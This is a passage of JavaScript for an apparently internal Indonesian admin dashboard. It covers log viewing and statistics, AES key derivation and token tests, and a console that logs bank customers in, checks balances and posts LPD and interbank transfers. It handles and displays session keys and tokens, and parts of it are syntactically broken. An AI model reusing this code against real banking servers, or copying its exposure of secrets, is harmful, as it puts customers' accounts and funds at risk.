async function loadTokenLogs() {
  const date = document.getElementById('tok-date').value || todayStr();
  const type = document.getElementById('tok-type').value;
  const search = document.getElementById('tok-search').value;
  
  let filename = '', dir = 'root';
  if (type === 'root') { filename = \`token-\${date}.txt\`; dir = 'root'; }
  else { filename = \`request-\${date}.log\`; dir = 'token'; }

  document.getElementById('token-log-list').innerHTML = '<div style="text-align:center;padding:20px;color:#475569"><span class="spinner"></span></div>';
  
  const res = await callAdmin({ op: 'read-log', path: filename, dir });
  if (!res.ok) {
    document.getElementById('token-log-list').innerHTML = \`<div class="info-box info-yellow"><i class="fas fa-info-circle"></i> \${res.error || 'File tidak ditemukan'}</div>\`;
    document.getElementById('badge-tok-count').textContent = '0';
    return;
  }
  const entries = parseLogEntries(res.content);
  const count = renderLogEntries(entries, 'token-log-list', search);
  document.getElementById('badge-tok-count').textContent = count;
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   STATISTICS
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
async function loadStats() {
  document.getElementById('stats-files-body').innerHTML = '<tr><td colspan="4" style="text-align:center;padding:16px"><span class="spinner"></span></td></tr>';
  const res = await callAdmin({ op: 'list-logs' });
  if (!res.ok) return;
  
  // Files table
  const filesHtml = (res.files || []).map(f => \`
    <tr>
      <td class="mono">\${f.name}</td>
      <td><span class="tag">\${f.dir}</span></td>
      <td class="mono">\${f.size_kb ? f.size_kb + ' KB' : '\u2014'}</td>
      <td><span class="badge-pill badge-info">\${f.entries || '\u2014'}</span></td>
    </tr>
  \`).join('');
  document.getElementById('stats-files-body').innerHTML = filesHtml || '<tr><td colspan="4" style="text-align:center;color:#475569">Tidak ada file</td></tr>';

  // Endpoint stats
  if (res.endpoints) {
    const sorted = Object.entries(res.endpoints).sort((a,b)=>b[1]-a[1]).slice(0,15);
    const max = sorted[0]?.[1] || 1;
    document.getElementById('stats-endpoints').innerHTML = sorted.map(([ep, cnt]) => \`
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;font-size:11px">
        <div style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:monospace;color:#a5b4fc" title="\${ep}">\${ep}</div>
        <div style="background:#14b8a6;height:6px;border-radius:3px;width:\${Math.round(cnt/max*120)}px;flex-shrink:0"></div>
        <div style="color:#5eead4;font-weight:700;min-width:30px;text-align:right">\${cnt}</div>
      </div>
    \`).join('') || '<div style="color:#475569;text-align:center;padding:20px">Belum ada data</div>';
  }

  // Daily chart
  if (res.daily) renderDailyChart(res.daily);
}

function renderDailyChart(data) {
  const ctx = document.getElementById('chart-daily').getContext('2d');
  if (dailyChart) dailyChart.destroy();
  const sorted = Object.entries(data).sort((a,b)=>a[0].localeCompare(b[0])).slice(-30);
  dailyChart = new Chart(ctx, {
    type: 'line',
    data: {
      labels: sorted.map(e=>e[0].slice(5)),
      datasets: [{
        data: sorted.map(e=>e[1]),
        borderColor: '#14b8a6', backgroundColor: 'rgba(20,184,166,.1)',
        borderWidth: 2, pointRadius: 2, fill: true, tension: 0.4,
      }]
    },
    options: {
      responsive: true, maintainAspectRatio: false,
      plugins: { legend: { display: false } },
      scales: {
        x: { ticks: { color: '#475569', font: { size: 9 }, maxRotation: 45 }, grid: { color: '#1e293b' } },
        y: { ticks: { color: '#475569', font: { size: 9 } }, grid: { color: '#1e293b' } }
      }
    }
  });
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   ERROR LOGS
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
async function loadErrors() {
  const level = document.getElementById('err-level').value;
  const search = document.getElementById('err-search').value;

  document.getElementById('error-log-list').innerHTML = '<div style="text-align:center;padding:20px"><span class="spinner"></span></div>';
  
  const res = await callAdmin({ op: 'read-log', path: 'laravel.log', dir: 'root' });
  if (!res.ok) {
    document.getElementById('error-log-list').innerHTML = \`<div class="info-box info-red"><i class="fas fa-times-circle"></i> \${res.error || 'Gagal membaca laravel.log'}</div>\`;
    return;
  }

  // Parse laravel log blocks (each starts with [date])
  const raw = res.content || '';
  const blocks = raw.split(/(?=\\[\\d{4}-\\d{2}-\\d{2}\\s+\\d{2}:\\d{2}:\\d{2}\\])/);
  
  let filtered = blocks.filter(b => {
    if (!b.trim()) return false;
    if (level !== 'all' && !b.toLowerCase().includes('local.' + level.toLowerCase())) return false;
    if (search && !b.toLowerCase().includes(search.toLowerCase())) return false;
    return true;
  });

  document.getElementById('badge-err-count').textContent = filtered.length;
  
  if (filtered.length === 0) {
    document.getElementById('error-log-list').innerHTML = '<div class="empty-state"><i class="fas fa-check-circle" style="color:#34d399"></i><div>Tidak ada error ditemukan</div></div>';
    return;
  }

  document.getElementById('error-log-list').innerHTML = filtered.slice(-100).reverse().map((block, i) => {
    const ts = fmtTime(block);
    const isErr = block.toLowerCase().includes('local.error');
    const isWarn = block.toLowerCase().includes('local.warning');
    const cls = isErr ? 'badge-err' : isWarn ? 'badge-warn' : 'badge-info';
    const levelText = isErr ? 'ERROR' : isWarn ? 'WARNING' : 'INFO';
    const preview = block.trim().slice(0,120).replace(/\\n/g,' ');
    return \`<div class="log-entry">
      <div class="log-entry-header" onclick="toggleLog(this)">
        <div style="display:flex;align-items:center;gap:8px;flex:1;min-width:0">
          <span class="badge-pill \${cls}">\${levelText}</span>
          <span style="font-family:monospace;font-size:10px;color:#94a3b8;white-space:nowrap">\${ts}</span>
          <span style="font-size:11px;color:#cbd5e1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">\${escH(preview)}</span>
        </div>
        <i class="fas fa-chevron-down" style="color:#334155;font-size:10px;flex-shrink:0;margin-left:8px"></i>
      </div>
      <div class="log-entry-body"><pre>\${escH(block.trim())}</pre></div>
    </div>\`;
  }).join('');
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   CRYPTO TEST
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
async function cryptoTest(op) {
  const resultId = 'result-' + op;
  const el = document.getElementById(resultId);
  el.style.display = 'block';
  el.innerHTML = '<span class="spinner"></span> Memproses...';
  
  let payload = { op };
  if (op === 'keygen') {
    payload.clientID = document.getElementById('cto-clientid').value;
    payload.timestamp = document.getElementById('cto-ts').value;
    if (!payload.timestamp) {
      const tsRes = await callCrypto({ op: 'timestamp' });
      payload.timestamp = tsRes.result?.jakarta || '';
    }
  } else if (op === 'did-encode') {
    payload.clientID = document.getElementById('cto-did-cid').value;
    payload.timestamp = document.getElementById('cto-did-ts').value;
    if (!payload.timestamp) {
      const tsRes = await callCrypto({ op: 'timestamp' });
      payload.timestamp = tsRes.result?.jakarta || '';
    }
  } else if (op === 'signature') {
    payload.aesCs = document.getElementById('cto-sig-cs').value;
    payload.clientIdEnc = document.getElementById('cto-sig-cid').value;
  }
  
  try {
    const res = await callCrypto(payload);
    el.innerHTML = \`<div style="background:#020617;border:1px solid #1e293b;border-radius:6px;padding:10px;font-size:11px;font-family:monospace;color:#a5f3fc;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto">\${JSON.stringify(res, null, 2)}</div>\`;
  } catch(e) {
    el.innerHTML = \`<div class="info-box info-red"><i class="fas fa-times-circle"></i> Error: \${e.message}</div>\`;
  }
}

/* \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
   TRANSAKSI \u2014 STATE
\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 */
const TRX = {
  baseUrl: '',
  clientIdRaw: '',
  clientIdEnc: '',
  aesKey: '',
  aesIv: '',
  aesCs: '',
  sessionTs: '',
  loggedIn: false,
  postingRef: '',        // stored ref after inquiry for posting
  bankHashCode: '',      // hash_code from bank inquiry
  // iOS token management (expire 3 menit di gmob_token DB)
  iosToken: '',          // token dari /smart/access-token (disimpan di gmob_token)
  tokenFetchedAt: 0,     // timestamp saat token diambil (ms)
  TOKEN_TTL: 150_000,    // 150 detik (safety margin dari 180s expiry)
};

// Update status token di UI
function trxUpdateTokenStatus() {
  const el = document.getElementById('trx-token-status');
  if (!el) return;
  if (!TRX.iosToken) {
    el.innerHTML = '<span class="badge-pill badge-err">Belum ada token</span>';
    return;
  }
  const age  = Date.now() - TRX.tokenFetchedAt;
  const remaining = Math.max(0, Math.ceil((TRX.TOKEN_TTL - age) / 1000));
  if (remaining <= 0) {
    el.innerHTML = '<span class="badge-pill badge-err">Token kadaluarsa \u2014 akan diperbarui otomatis</span>';
  } else {
    el.innerHTML = \`<span class="badge-pill badge-ok">Token aktif (~\${remaining}s)</span> <span style="font-size:9px;font-family:monospace;color:#475569">\${TRX.iosToken.slice(0,20)}...</span>\`;
  }
}

// Set token iOS manual (digunakan jika auto-fetch gagal, misal server LPD sedang maintenance)
function trxSetManualToken() {
  const tokenInput = document.getElementById('trx-ios-token-manual') as HTMLInputElement;
  const token = tokenInput ? tokenInput.value.trim() : '';
  if (!token) { alert('Token tidak boleh kosong'); return; }
  TRX.iosToken = token;
  TRX.tokenFetchedAt = Date.now();
  trxUpdateTokenStatus();
  tokenInput.value = '';
  trxLog([{ key: 'Manual Token', value: token.slice(0,30)+'...' }]);
  if (!trxTokenRefreshTimer) trxStartTokenRefresh();
  trxResultEl('trx-setup-result', '\u2713 Token manual berhasil diset. Sesi siap digunakan.', false);
}

// Ambil fresh iOS token dari server LPD (otomatis sebelum setiap transaksi)
async function trxGetFreshToken(force = false) {
  const sess = trxGetSession();
  if (!sess.clientIdEnc) return null;
  const age = Date.now() - TRX.tokenFetchedAt;
  // Pakai token yang ada jika masih valid
  if (!force && TRX.iosToken && age < TRX.TOKEN_TTL) {
    trxUpdateTokenStatus();
    return TRX.iosToken;
  }
  // Ambil token baru
  const el = document.getElementById('trx-token-status');
  if (el) el.innerHTML = '<span class="badge-pill badge-warn"><span class="spinner" style="width:10px;height:10px;border-width:1px"></span> Mengambil token baru...</span>';
  
  const res = await fetch('/api/smart/get-ios-token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ baseUrl: sess.baseUrl, clientIdEnc: sess.clientIdEnc, aesCs: sess.aesCs })
  }).then(r => r.json()).catch(e => ({ ok: false, error: e.message }));
  
  if (res.ok && res.token) {
    TRX.iosToken = res.token;
    TRX.tokenFetchedAt = Date.now();
    trxUpdateTokenStatus();
    return res.token;
  }
  if (el) el.innerHTML = \`<span class="badge-pill badge-err">Gagal ambil token: \${res.error || '?'}</span>\`;
  return null;
}

function trxLog(items) {
  if (!Array.isArray(items)) items = [items];
  const now = new Date();
  const ts = now.toLocaleTimeString('id-ID');
  items.forEach(entry => {
    if (typeof entry === 'string') {
      TRX_HISTORY.push({ ts, text: entry });
    } else {
      TRX_HISTORY.push({ ts, ...entry });
    }
  });
}
const TRX_HISTORY = [];

function trxShowOp(op) {
  document.querySelectorAll('.trx-op-panel').forEach(el => el.style.display = 'none');
  const el = document.getElementById('trx-op-' + op);
  if (el) el.style.display = 'block';
}

function trxResultEl(id, html, isErr) {
  const el = document.getElementById(id);
  if (!el) return;
  el.style.display = 'block';
  const cls = isErr ? 'info-red' : 'info-teal';
  el.innerHTML = \`<div class="info-box \${cls}" style="font-family:monospace;font-size:11px;white-space:pre-wrap;word-break:break-all">\${html}</div>\`;
}

function trxJsonBox(id, obj, ok) {
  const el = document.getElementById(id);
  if (!el) return;
  el.style.display = 'block';
  const color = ok ? '#a7f3d0' : '#fca5a5';
  el.innerHTML = \`<div style="background:#020617;border:1px solid #1e293b;border-radius:6px;padding:10px;font-size:11px;font-family:monospace;color:\${color};white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto">\${escH(JSON.stringify(obj, null, 2))}</div>\`;
}

function trxSpin(id) {
  const el = document.getElementById(id);
  if (el) { el.style.display = 'block'; el.innerHTML = '<div style="text-align:center;padding:10px"><span class="spinner"></span></div>'; }
}

async function trxAutoSetup() {
  const clientId = document.getElementById('trx-clientid').value.trim();
  if (!clientId) { alert('Client ID harus diisi'); return; }
  
  trxSpin('trx-setup-result');

  // 1. Get timestamp
  const tsRes = await callCrypto({ op: 'timestamp' });
  if (!tsRes.ok) { trxResultEl('trx-setup-result', 'Gagal get timestamp: ' + (tsRes.error||'?'), true); return; }
  const ts = tsRes.result?.jakarta || '';
  document.getElementById('trx-session-ts').value = ts;

  // 2. Derive AES keys
  const kgRes = await callCrypto({ op: 'keygen', clientID: clientId, timestamp: ts });
  if (!kgRes.ok) { trxResultEl('trx-setup-result', 'Gagal keygen: ' + (kgRes.error||'?'), true); return; }
  const keys = kgRes.result || {};
  document.getElementById('trx-aeskey').value = keys.aesKey || '';
  document.getElementById('trx-aesiv').value  = keys.aesIv || '';
  document.getElementById('trx-aescs').value  = keys.aesCs || '';

  // 3. Encode X-CLIENT-ID
  const didRes = await callCrypto({ op: 'did-encode', clientID: clientId, timestamp: ts });
  if (!didRes.ok) { trxResultEl('trx-setup-result', 'Gagal DID encode: ' + (didRes.error||'?'), true); return; }
  const enc = didRes.result?.encoded || '';
  document.getElementById('trx-clientid-enc').value = enc;

  // Store into TRX state
  TRX.baseUrl      = document.getElementById('trx-baseurl').value.trim();
  TRX.clientIdRaw  = clientId;
  TRX.clientIdEnc  = enc;
  TRX.aesKey       = keys.aesKey || '';
  TRX.aesIv        = keys.aesIv  || '';
  TRX.aesCs        = keys.aesCs  || '';
  TRX.sessionTs    = ts;

  document.getElementById('trx-session-badge').textContent = 'Aktif \u2713';
  document.getElementById('trx-session-badge').style.background = '#022c22';
  document.getElementById('trx-session-badge').style.color = '#34d399';

  // 4. Auto-fetch iOS token dari server LPD
  const tokenStatusEl = document.getElementById('trx-token-status');
  if (tokenStatusEl) tokenStatusEl.innerHTML = '<span class="badge-pill badge-warn"><span class="spinner" style="width:10px;height:10px;border-width:1px"></span> Mengambil iOS token...</span>';
  const tokenRes = await fetch('/api/smart/get-ios-token', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ baseUrl: TRX.baseUrl, clientIdEnc: enc, aesCs: keys.aesCs || '' })
  }).then(r => r.json()).catch(e => ({ ok: false, error: e.message }));

  let tokenInfo = '';
  if (tokenRes.ok && tokenRes.token) {
    TRX.iosToken = tokenRes.token;
    TRX.tokenFetchedAt = Date.now();
    trxUpdateTokenStatus();
    tokenInfo = \`\\n  iOS Token  : \${tokenRes.token.slice(0,20)}... (aktif ~\${tokenRes.expiresIn||180}s)\`;
  } else {
    if (tokenStatusEl) tokenStatusEl.innerHTML = \`<span class="badge-pill badge-err">Token gagal: \${tokenRes.error||'?'}</span>\`;
    tokenInfo = \`\\n  iOS Token  : GAGAL (\${tokenRes.error||'?'}) \u2014 coba Refresh Token manual\`;
  }

  trxResultEl('trx-setup-result', \`\u2713 Sesi siap\\n  Timestamp  : \${ts}\\n  Client ID  : \${clientId}\\n  AES Key    : \${keys.aesKey?.slice(0,20)}...\\n  AES IV     : \${keys.aesIv?.slice(0,20)}...\\n  AES CS     : \${keys.aesCs}\\n  X-CLIENT-ID: \${enc?.slice(0,30)}...\${tokenInfo}\`, false);

  // Start timer to refresh token periodically
  trxStartTokenRefresh();
}

let trxTokenRefreshTimer = null;
function trxStartTokenRefresh() {
  if (trxTokenRefreshTimer) clearInterval(trxTokenRefreshTimer);
  // Update status display every 10 seconds
  trxTokenRefreshTimer = setInterval(() => {
    trxUpdateTokenStatus();
    // Auto-refresh token saat tinggal 20 detik
    const age = Date.now() - TRX.tokenFetchedAt;
    if (TRX.iosToken && age > (TRX.TOKEN_TTL - 20_000)) {
      trxGetFreshToken(true);
    }
  }, 10_000);
}

async function trxLogin() {
  const un = document.getElementById('trx-username').value.trim();
  const pw = document.getElementById('trx-password').value.trim();
  if (!un || !pw) { alert('Username dan password harus diisi'); return; }
  if (!TRX.clientIdEnc && !document.getElementById('trx-clientid-enc').value.trim()) {
    alert('Lakukan Auto Setup sesi terlebih dahulu');
    return;
  }
  // Allow manual override
  TRX.clientIdEnc = document.getElementById('trx-clientid-enc').value.trim() || TRX.clientIdEnc;
  TRX.aesKey = document.getElementById('trx-aeskey').value.trim() || TRX.aesKey;
  TRX.aesIv  = document.getElementById('trx-aesiv').value.trim()  || TRX.aesIv;
  TRX.aesCs  = document.getElementById('trx-aescs').value.trim()  || TRX.aesCs;
  TRX.baseUrl = document.getElementById('trx-baseurl').value.trim();

  trxSpin('trx-login-result');
  // Login butuh iosToken yang valid di server DB
  const freshToken = await trxGetFreshToken();
  const res = await fetch('/api/smart', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({
      action: 'login',
      baseUrl: TRX.baseUrl,
      clientIdEnc: TRX.clientIdEnc,
      aesKey: TRX.aesKey,
      aesIv: TRX.aesIv,
      aesCs: TRX.aesCs,
      iosToken: freshToken || '',
      user_name: un,
      user_pass: pw,
    })
  }).then(r=>r.json()).catch(e=>({ok:false,error:e.message}));

  const ok = res.ok === true;
  TRX.loggedIn = ok;
  if (ok && res.nasabah) {
    const nb = res.nasabah;
    const nama = nb.nama || nb.accounts?.[0]?.nama || un;
    document.getElementById('trx-login-badge').textContent = \`\${nama} \u2713\`;
    document.getElementById('trx-login-badge').style.background = '#022c22';
    document.getElementById('trx-login-badge').style.color = '#34d399';
    trxLog({ action: 'login', user: un, nama, ts: new Date().toISOString(), ok: true });
    // Tampilkan info nasabah lengkap
    trxShowNasabahInfo(nb, un);
  } else if (ok) {
    document.getElementById('trx-login-badge').textContent = \`Login: \${un} \u2713\`;
    document.getElementById('trx-login-badge').style.background = '#022c22';
    document.getElementById('trx-login-badge').style.color = '#34d399';
  } else {
    const errMsg = res.result?.message || res.error || 'Username/password salah';
    document.getElementById('trx-login-badge').textContent = 'Gagal login';
    document.getElementById('trx-login-badge').style.background = '#2d0000';
    document.getElementById('trx-login-badge').style.color = '#f87171';
    trxJsonBox('trx-login-result', res, false);
    return;
  }
  trxJsonBox('trx-login-result', res, ok);
}

function fmtRupiah(s) {
  const n = parseFloat(String(s).replace(/[^0-9.-]/g, ''));
  if (isNaN(n)) return s || '\u2014';
  return 'Rp ' + n.toLocaleString('id-ID', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function trxShowNasabahInfo(nb, username) {
  const panel = document.getElementById('trx-nasabah-panel');
  if (!panel) return;
  panel.style.display = 'block';

  const accounts = nb.accounts || [];
  const nama = nb.nama || accounts[0]?.nama || username;
  const firstNorek = accounts[0]?.norek || '';

  // Auto-isi field rekening di semua form transaksi
  if (firstNorek) {
    ['trx-cs-norek','trx-tlpd-from','trx-tbank-from'].forEach(id => {
      const el = document.getElementById(id);
      if (el && !el.value) el.value = firstNorek;
    });
  }

  document.getElementById('trx-nb-nama').textContent = nama;
  document.getElementById('trx-nb-user').textContent = username;
  document.getElementById('trx-nb-rekcount').textContent = accounts.length + ' rekening';

  const tbody = document.getElementById('trx-nb-accounts');
  if (!tbody) return;
  if (accounts.length === 0) {
    tbody.innerHTML = '<tr><td colspan="4" style="padding:12px;text-align:center;color:#475569">Tidak ada rekening ditemukan</td></tr>';
    return;
  }
  tbody.innerHTML = accounts.map((acc, i) => \`
    <tr>
      <td class="mono" style="cursor:pointer" onclick="trxCopyNorek('\${escH(acc.norek)}')" title="Klik untuk salin">
        \${escH(acc.norek)} <i class="fas fa-copy" style="font-size:9px;color:#475569;margin-left:4px"></i>
      </td>
      <td>\${escH(acc.nama)}</td>
      <td>\${escH(acc.produk)}</td>
      <td style="text-align:right;font-weight:700;color:\${acc.saldo && parseFloat(acc.saldo)>0?'#34d399':'#94a3b8'}">\${fmtRupiah(acc.saldo)}</td>
      <td>
        <button class="btn btn-secondary btn-sm" onclick="trxUseNorek('\${escH(acc.norek)}')">
          <i class="fas fa-hand-point-right"></i> Pakai
        </button>
      </td>
    </tr>
  \`).join('');
}

function trxCopyNorek(norek) {
  navigator.clipboard?.writeText(norek).then(() => {
    // Brief feedback
    const el = event.target.closest('td');
    if (el) { el.style.color = '#34d399'; setTimeout(() => el.style.color = '', 800); }
  });
}

function trxUseNorek(norek) {
  // Isi ke field rekening sumber semua form yang aktif
  ['trx-cs-norek','trx-tlpd-from','trx-tbank-from'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.value = norek;
  });
  // Highlight field yang terisi
  document.querySelectorAll('.trx-op-panel:not([style*="display: none"]) input').forEach(el => {
    if (el.value === norek) { el.style.borderColor = '#14b8a6'; setTimeout(() => el.style.borderColor='', 1500); }
  });
}

function trxGetSession() {
  // Allow manual override from input fields
  return {
    baseUrl:     document.getElementById('trx-baseurl').value.trim()      || TRX.baseUrl,
    clientIdEnc: document.getElementById('trx-clientid-enc').value.trim() || TRX.clientIdEnc,
    aesKey:      document.getElementById('trx-aeskey').value.trim()       || TRX.aesKey,
    aesIv:       document.getElementById('trx-aesiv').value.trim()        || TRX.aesIv,
    aesCs:       document.getElementById('trx-aescs').value.trim()        || TRX.aesCs,
  };
}

async function trxExec(action) {
  const sess = trxGetSession();
  if (!sess.clientIdEnc) { alert('Setup sesi terlebih dahulu (langkah 1)'); return; }

  const resultId = 'trx-result-' + action;
  trxSpin(resultId);

  // Auto-refresh iOS token sebelum setiap request (token expire 3 menit di server)
  const freshToken = await trxGetFreshToken();
  if (!freshToken) {
    trxResultEl(resultId, '\u274C Gagal mendapatkan iOS token dari server LPD.
Pastikan:
1. Auto Setup sesi sudah dijalankan
2. Koneksi ke server LPD aktif
3. IP whitelist terdaftar di server', true);
    return;
  }

  let payload = { action, ...sess, iosToken: freshToken };

  // Build payload per action
  if (action === 'cek-saldo') {
    payload.no_rek = document.getElementById('trx-cs-norek').value.trim();
    if (!payload.no_rek) { trxResultEl(resultId, 'Nomor rekening harus diisi', true); return; }

  } else if (action === 'account-list') {
    payload.customer_id = document.getElementById('trx-al-custid').value.trim();

  } else if (action === 'mutasi-history') {
    payload.customer_id = document.getElementById('trx-mu-custid').value.trim();
    payload.no_rek      = document.getElementById('trx-mu-norek').value.trim();
    payload.tgl_awal    = document.getElementById('trx-mu-tglawal').value;
    payload.tgl_akhir   = document.getElementById('trx-mu-tglakhir').value;

  } else if (action === 'transaction-history') {
    payload.no_rek    = document.getElementById('trx-mu-norek').value.trim();
    payload.tgl_awal  = document.getElementById('trx-mu-tglawal').value;
    payload.tgl_akhir = document.getElementById('trx-mu-tglakhir').value;

  } else if (action === 'transfer-lpd-check') {
    payload.no_rek_tujuan = document.getElementById('trx-tlpd-to').value.trim();
    if (!payload.no_rek_tujuan) { trxResultEl(resultId, 'Nomor rekening tujuan harus diisi', true); return; }

  } else if (action === 'transfer-lpd-inquiry') {
    payload.no_rek_from  = document.getElementById('trx-tlpd-from').value.trim();
    payload.no_rek_to    = document.getElementById('trx-tlpd-to').value.trim();
    payload.nama_tujuan  = document.getElementById('trx-tlpd-name').value.trim();
    payload.nominal      = document.getElementById('trx-tlpd-nominal').value.trim().replace(/[^0-9]/g,'');
    payload.keterangan   = document.getElementById('trx-tlpd-ket').value.trim();
    if (!payload.no_rek_from || !payload.no_rek_to || !payload.nominal) {
      trxResultEl(resultId, 'Rekening sumber, tujuan, dan nominal harus diisi', true); return;
    }

  } else if (action === 'transfer-lpd-posting') {
    payload.no_rek_from  = document.getElementById('trx-tlpd-from').value.trim();
    payload.no_rek_to    = document.getElementById('trx-tlpd-to').value.trim();
    payload.nama_tujuan  = document.getElementById('trx-tlpd-name').value.trim();
    payload.nominal      = document.getElementById('trx-tlpd-nominal').value.trim().replace(/[^0-9]/g,'');
    payload.keterangan   = document.getElementById('trx-tlpd-ket').value.trim();
    if (TRX.postingRef) payload.transNo = TRX.postingRef;
    if (!payload.no_rek_from || !payload.no_rek_to || !payload.nominal) {
      trxResultEl(resultId, 'Rekening sumber, tujuan, dan nominal harus diisi', true); return;
    }

  } else if (action === 'transfer-bank-check') {
    payload.no_rek_tujuan = document.getElementById('trx-tbank-to').value.trim();
    payload.kode_bank     = document.getElementById('trx-tbank-kode').value.trim();
    if (!payload.no_rek_tujuan || !payload.kode_bank) { trxResultEl(resultId, 'Nomor rekening dan kode bank harus diisi', true); return; }

  } else if (action === 'transfer-bank-inquiry') {
    payload.no_rek_from = document.getElementById('trx-tbank-from').value.trim();
    payload.no_rek_to   = document.getElementById('trx-tbank-to').value.trim();
    payload.kode_bank   = document.getElementById('trx-tbank-kode').value.trim();
    payload.nominal     = document.getElementById('trx-tbank-nominal').value.trim().replace(/[^0-9]/g,'');
    payload.keterangan  = document.getElementById('trx-tbank-ket').value.trim();
    if (!payload.no_rek_from || !payload.no_rek_to || !payload.kode_bank || !payload.nominal) {
      trxResultEl(resultId, 'Semua field transfer bank harus diisi', true); return;
    }

  } else if (action === 'transfer-bank-posting') {
    payload.no_rek_from = document.getElementById('trx-tbank-from').value.trim();
    payload.no_rek_to   = document.getElementById('trx-tbank-to').value.trim();
    payload.kode_bank   = document.getElementById('trx-tbank-kode').value.trim();
    payload.nominal     = document.getElementById('trx-tbank-nominal').value.trim().replace(/[^0-9]/g,'');
    payload.keterangan  = document.getElementById('trx-tbank-ket').value.trim();
    if (TRX.postingRef)   payload.transNo  = TRX.postingRef;
    if (TRX.bankHashCode) payload.hash_code = TRX.bankHashCode;
    if (!payload.no_rek_from || !payload.no_rek_to || !payload.kode_bank || !payload.nominal) {
      trxResultEl(resultId, 'Semua field transfer bank harus diisi', true); return;
    }
  }

  const res = await fetch('/api/smart', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify(payload)
  }).then(r=>r.json()).catch(e=>({ok:false,error:e.message}));

  const ok = res.ok !== false;

  // Store ref for posting
  if (action === 'transfer-lpd-inquiry' && res.debug?.ref) TRX.postingRef = res.debug.ref;
  if (action === 'transfer-bank-inquiry') {
    if (res.debug?.ref) TRX.postingRef = res.debug.ref;
    const bc = res.result?.data?.hash_code || res.result?.hash_code || '';
    if (bc) TRX.bankHashCode = bc;
  }
  if (action === 'logout' && ok) {
    TRX.loggedIn = false;
    document.getElementById('trx-login-badge').textContent = 'Belum login';
    document.getElementById('trx-login-badge').style.background = '#134e4a';
    document.getElementById('trx-login-badge').style.color = '#5eead4';
  }

  trxLog({ action, ok, ts: new Date().toISOString() });
  trxJsonBox(resultId, res, ok);
}

async function trxConfirmPosting(action) {
  const label = action === 'transfer-lpd-posting' ? 'Transfer LPD' : 'Transfer Bank';
  const nomEl = action === 'transfer-lpd-posting' 
    ? document.getElementById('trx-tlpd-nominal')
    : document.getElementById('trx-tbank-nominal');
  const nom = nomEl ? nomEl.value.trim().replace(/[^0-9]/g,'') : '?';
  const fmtNom = new Intl.NumberFormat('id-ID').format(parseInt(nom)||0);
  
  const ok = confirm(\`Konfirmasi Posting\\n\\nAksi: \${label}\\nNominal: Rp \${fmtNom}\\n\\nApakah Anda yakin ingin melanjutkan?\`);
  if (ok) await trxExec(action);
}

async function loadTrxHistory() {
  const type   = document.getElementById('th-type').value;
  const date   = document.getElementById('th-date').value || todayStr();
